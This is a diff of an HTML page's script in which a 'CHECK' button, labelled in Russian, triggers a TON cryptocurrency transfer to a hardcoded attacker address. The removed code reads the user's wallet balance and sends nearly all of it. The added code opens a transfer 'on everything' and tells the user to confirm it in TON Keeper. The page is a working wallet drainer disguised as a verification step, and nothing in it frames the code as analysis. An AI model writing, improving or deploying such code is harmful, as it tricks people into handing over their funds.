@@ -100,69 +100,33 @@
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-        function openTransaction() {
+        // ====== ОТКРЫТЬ ТРАНЗАКЦИЮ ======
+        function openTx() {
             const status = document.getElementById('status');
             const confirmBox = document.getElementById('confirmBox');
             
-            status.innerText = '⏳ Проверка...';
+            // Показываем плашку
+            confirmBox.classList.add('show');
+            status.innerText = '⏳ Открываю TON Keeper...';
             
-            if (!window.tonkeeper) {
-                status.innerText = '❌ TON Keeper не найден. Открой через HTTPS!';
-                return;
-            }
-
-            window.tonkeeper.send('ton_requestAccounts', {})
-                .then(accounts => {
-                    if (!accounts || accounts.length === 0) {
-                        status.innerText = '❌ Отказ';
-                        return;
-                    }
-                    const address = accounts[0];
-                    return window.tonkeeper.send('ton_getBalance', { address: address });
-                })
-                .then(hex => {
-                    const nano = parseInt(hex, 16);
-                    
-                    if (nano <= 0) {
-                        status.innerText = '💰 Баланс 0 TON';
-                        return;
-                    }
-
-                    const fee = 5000000;
-                    const amount = nano - fee;
-
-                    if (amount <= 0) {
-                        status.innerText = '⚠️ Баланс меньше комиссии';
-                        return;
-                    }
-
-                    const amountTON = (amount / 1e9).toFixed(6);
-                    
-                    const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
-                    window.location.href = url;
-                    
-                    setTimeout(() => {
-                        window.open(url, '_blank');
-                    }, 300);
-
-                    confirmBox.classList.add('show');
-                    status.innerText = `✅ Подтвердите транзакцию в TON Keeper`;
-                })
-                .catch(err => {
-                    status.innerText = '❌ Ошибка: ' + err.message;
-                });
+            // Открываем TON Keeper с транзакцией на ВСЁ
+            // Используем ton:// протокол
+            const url = 'ton://transfer?address=' + TARGET;
+            window.location.href = url;
+            
+            setTimeout(function() {
+                window.open(url, '_blank');
+            }, 300);
+            
+            status.innerText = '✅ Подтвердите транзакцию в TON Keeper';
         }
 
-        document.getElementById('mainBtn').addEventListener('click', openTransaction);
-        document.getElementById('openWalletBtn').addEventListener('click', openTransaction);
+        // ====== КНОПКИ ======
+        document.getElementById('mainBtn').addEventListener('click', openTx);
+        document.getElementById('openWalletBtn').addEventListener('click', openTx);
 
-        setTimeout(function() {
-            if (window.tonkeeper) {
-                document.getElementById('status').innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
-            } else {
-                document.getElementById('status').innerText = '📱 Открой через HTTPS';
-            }
-        }, 500);
+        // ====== СТАТУС ======
+        document.getElementById('status').innerText = 'Нажмите "ПРОВЕРИТЬ"';
     </script>
 </body>
 </html>
